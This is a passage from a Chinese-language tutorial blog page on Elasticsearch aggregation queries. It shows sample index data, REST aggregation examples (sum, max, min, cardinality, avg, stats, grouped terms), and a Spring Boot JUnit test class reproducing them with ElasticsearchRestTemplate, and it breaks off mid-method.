class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/2  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/3  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;小卷&quot;,&quot;buyCount&quot;:18,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/4  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;小明&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/5  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/6  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:8,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/7  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/8  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;诸葛亮&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/9  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;黄忠&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/10  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李白&quot;,&quot;buyCount&quot;:1,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/11  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/12  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/13  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/14  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/15  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/16  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>聚合查询语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;aggs&quot; : &#123;  </span><br><span class=\"line\">    &quot;&lt;aggregation\\_name&gt;&quot; : &#123;                                 &lt;!--聚合名称 --&gt;  </span><br><span class=\"line\">        &quot;&lt;aggregation\\_type&gt;&quot; : &#123;                             &lt;!--聚合类型 --&gt;  </span><br><span class=\"line\">            &lt;aggregation\\_body&gt;                               &lt;!--聚合具体字段 --&gt;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        \\[,&quot;meta&quot; : &#123;  \\[&lt;meta\\_data\\_body&gt;\\] &#125; \\]?                &lt;!--元信息 --&gt;  </span><br><span class=\"line\">        \\[,&quot;aggs&quot; : &#123; \\[&lt;sub\\_aggregation&gt;\\]+ &#125; \\]?       &lt;!--子聚合 --&gt;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>查询 buyCount 的总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /jh\\_test/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountSum&quot;:&#123;  </span><br><span class=\"line\">      &quot;sum&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>查询 2021-02 月 buyCount 的总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-02&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountSum&quot;:&#123;  </span><br><span class=\"line\">      &quot;sum&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>查询 2021-03 月 buyCount 的最大值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMax&quot;:&#123;  </span><br><span class=\"line\">      &quot;max&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>查询 2021-03 月 buyCount 的最小值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMin&quot;:&#123;  </span><br><span class=\"line\">      &quot;min&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>同时查询 2021-03 月 buyCount 的最大值和最小值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMax&quot;:&#123;  </span><br><span class=\"line\">      &quot;max&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">     &quot;buyCountMin&quot;:&#123;  </span><br><span class=\"line\">      &quot;min&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>查询所有 name 的去重后的数量</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;distinctName&quot;:&#123;  </span><br><span class=\"line\">      &quot;cardinality&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><strong>查询 2021-04 月 name 的去重后的数量</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-04&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;distinctName&quot;:&#123;  </span><br><span class=\"line\">      &quot;cardinality&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li><strong>查询 BuyCount 的平均值</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:&quot;0&quot;,  </span><br><span class=\"line\">    &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">        &quot;buyCountAvg&quot;:&#123;  </span><br><span class=\"line\">            &quot;avg&quot;:&#123;  </span><br><span class=\"line\">                &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>一次查询 总数，最大值，最小值，平均值，总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;statsAll&quot;:&#123;  </span><br><span class=\"line\">      &quot;stats&quot;:&#123;  </span><br><span class=\"line\">        &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"10\">\n<li><strong>根据 createMonth 分组查询每个月的最大 buyCount</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:0,  </span><br><span class=\"line\">    &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class=\"line\">      &quot;terms&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class=\"line\">      &#125;,  </span><br><span class=\"line\">      &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">        &quot;buyCountMax&quot;: &#123;  </span><br><span class=\"line\">          &quot;max&quot;: &#123;  </span><br><span class=\"line\">            &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">          &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:0,  </span><br><span class=\"line\">    &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">    &quot;createMonthGroup&quot;: &#123;  </span><br><span class=\"line\">      &quot;terms&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;createMonth&quot;  </span><br><span class=\"line\">      &#125;,  </span><br><span class=\"line\">      &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">        &quot;sexGroup&quot;: &#123;  </span><br><span class=\"line\">          &quot;terms&quot;: &#123;  </span><br><span class=\"line\">            &quot;field&quot;: &quot;sex&quot;  </span><br><span class=\"line\">          &#125;,  </span><br><span class=\"line\">          &quot;aggs&quot;: &#123;  </span><br><span class=\"line\">                &quot;buyCountAvg&quot;: &#123;  </span><br><span class=\"line\">                    &quot;avg&quot;: &#123;  </span><br><span class=\"line\">                        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-2-2-ES客户端实现聚合查询\"><a href=\"#5-2-2-ES客户端实现聚合查询\" class=\"headerlink\" title=\"5.2.2 ES客户端实现聚合查询\"></a>5.2.2 ES客户端实现聚合查询</h3><p>测试代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@SpringBootTest  </span><br><span class=\"line\">@Slf4j  </span><br><span class=\"line\">public class AggregationTest &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Resource  </span><br><span class=\"line\">    ElasticsearchRestTemplate elasticsearchRestTemplate;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 buyCount 的总和  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs1() &#123;  </span><br><span class=\"line\">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(buyCountSum)  </span><br><span class=\"line\">//                .addAggregation(buyCountSum)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-02 月 buyCount 的总和：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs2() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-02&quot;);  </span><br><span class=\"line\">        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(&quot;buyCountSum&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountSum)  </span><br><span class=\"line\">//                .addAggregation(buyCountSum)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Sum sum = aggregations.get(&quot;buyCountSum&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 总数：&#123;&#125; &quot;, sum.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-03 月 buyCount 的最大值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs3() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMax)  </span><br><span class=\"line\">//                .addAggregation(buyCountMax)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 2021-03 月 buyCount 的最小值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs4() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMin)  </span><br><span class=\"line\">//                .addAggregation(buyCountMin)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 同时查询 2021-03 月 buyCount 的最大值和最小值：  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs5() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-03&quot;);  </span><br><span class=\"line\">        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(&quot;buyCountMax&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        MinAggregationBuilder buyCountMin = AggregationBuilders.min(&quot;buyCountMin&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(buyCountMax)  </span><br><span class=\"line\">                .withAggregations(buyCountMin)  </span><br><span class=\"line\">//                .addAggregation(buyCountMax)  </span><br><span class=\"line\">//                .addAggregation(buyCountMin)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Max max = aggregations.get(&quot;buyCountMax&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最大值：&#123;&#125; &quot;, max.getValue());  </span><br><span class=\"line\">                Min min = aggregations.get(&quot;buyCountMin&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 buyCount 最小值：&#123;&#125; &quot;, min.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询所有 name 的去重后的数量  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs6() &#123;  </span><br><span class=\"line\">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(distinctName)  </span><br><span class=\"line\">//                .addAggregation(distinctName)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\*  查询 2021-04 月 name 的去重后的数量  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs7() &#123;  </span><br><span class=\"line\">        QueryBuilder queryBuilder = QueryBuilders.termQuery(&quot;createMonth&quot;, &quot;2021-04&quot;);  </span><br><span class=\"line\">        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(&quot;distinctName&quot;).field(&quot;name.keyword&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withQuery(queryBuilder)  </span><br><span class=\"line\">                .withAggregations(distinctName)  </span><br><span class=\"line\">//                .addAggregation(distinctName)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                Cardinality cardinality = aggregations.get(&quot;distinctName&quot;);  </span><br><span class=\"line\">                log.info(&quot;计算 name 的去重后的数量：&#123;&#125; &quot;, cardinality.getValue());  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    /\\*\\*  </span><br><span class=\"line\">     \\* 查询 BuyCount 的平均值  </span><br><span class=\"line\">     \\*/  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    void aggs8() &#123;  </span><br><span class=\"line\">        AvgAggregationBuilder buyCountAvg = AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;);  </span><br><span class=\"line\">        Query query = new NativeSearchQueryBuilder()  </span><br><span class=\"line\">                .withAggregations(buyCountAvg)  </span><br><span class=\"line\">//                .addAggregation(buyCountAvg)  </span><br><span class=\"line\">                .build();  </span><br><span class=\"line\">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class=\"line\">        if (search.hasAggregations()) &#123;  </span><br><span class=\"line\">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class=\"line\">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class=\"line\">                